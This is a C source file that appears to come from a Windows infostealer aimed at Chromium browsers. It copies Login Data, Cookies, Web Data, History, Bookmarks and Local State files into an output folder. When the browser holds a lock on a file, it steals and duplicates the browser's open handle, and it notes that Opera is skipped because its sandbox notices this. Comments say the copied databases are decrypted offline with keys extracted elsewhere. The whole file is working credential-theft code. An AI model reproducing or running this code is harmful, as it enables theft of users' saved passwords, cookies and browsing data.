#include "DbCopy.h"
#include "HandleSteal.h"

// Copies one file: direct read first; when the browser holds an exclusive
// handle (e.g. Cookies) fall back to stealing + duplicating its open handle.
// Opera / Opera GX are excluded from the fallback: their sandbox aggressively
// monitors handle operations and self-terminates (FatalExit 21), unlike
// Chrome / Edge / Brave.
static BOOL CopyOneBrowserFile(IN BROWSER_TYPE Browser, IN LPCSTR pszSrcPath, IN LPCSTR pszRelPath, IN LPCSTR pszDstPath)
{
    if (CopyFileSharedA(pszSrcPath, pszDstPath))
        return TRUE;

    printf("[i] Target File Is Locked, Falling Back To Handle Duplication\n");

    if (Browser == BROWSER_OPERA || Browser == BROWSER_OPERA_GX)
    {
        LPSTR pszBrowserName = GetBrowserName(Browser);

        if (pszBrowserName)
            printf("[!] Handle Duplication Is Skipped For %s (Sandbox Self-Terminates)\n", pszBrowserName);

        HEAP_FREE(pszBrowserName);
        return FALSE;
    }

    return StealAndCopyFileHandle(Browser, pszRelPath, pszDstPath);
}

// Copies every known browser data file (SQLite DBs + Bookmarks + Local State)
// into pszOutputDir. Files are copied raw - the DB contents stay encrypted,
// decryption happens offline with the extracted keys.
VOID CopyBrowserFilesToOutputDir(IN BROWSER_TYPE Browser, IN LPCSTR pszOutputDir)
{
    const BROWSER_FILE_TYPE   eFileTypes[] = {
        FILE_TYPE_LOGIN_DATA,
        FILE_TYPE_COOKIES,
        FILE_TYPE_WEB_DATA,
        FILE_TYPE_HISTORY,
        FILE_TYPE_BOOKMARKS,
        FILE_TYPE_LOCAL_STATE
    };

    const DWORD  dwFileTypeCount = sizeof(eFileTypes) / sizeof(eFileTypes[0]);

    CHAR    szRelPath[MAX_PATH]   = { 0 };
    CHAR    szSrcPath[MAX_PATH]   = { 0 };
    CHAR    szDstPath[MAX_PATH]   = { 0 };
    DWORD   dwCopied              = 0x00;
    LPSTR   pszBrowserName        = NULL;

    if (!pszOutputDir)
        return;

    if (!(pszBrowserName = GetBrowserName(Browser)))
        return;

    printf("[*] Copying %s Data Files (No Decryption Needed) ...\n", pszBrowserName);

    for (DWORD i = 0; i < dwFileTypeCount; i++)
    {
        if (!GetChromiumBrowserFilePath(Browser, eFileTypes[i], szRelPath, MAX_PATH))
            continue;

        if (!BuildBrowserDataFilePath(Browser, szRelPath, szSrcPath, MAX_PATH))
        {
            printf("[-] Skipping '%s' (Not Found)\n", PathFindFileNameLocalA(szRelPath));
            continue;
        }

        wsprintfA(szDstPath, "%s\\%s", pszOutputDir, PathFindFileNameLocalA(szSrcPath));

        if (CopyOneBrowserFile(Browser, szSrcPath, szRelPath, szDstPath))
        {
            printf("[+] Copied '%s'\n", PathFindFileNameLocalA(szSrcPath));
            dwCopied++;
        }
        else
        {
            printf("[!] Failed To Copy '%s'\n", PathFindFileNameLocalA(szSrcPath));
        }
    }

    printf("[*] %lu File(s) Copied For %s\n", dwCopied, pszBrowserName);

    HEAP_FREE(pszBrowserName);
}
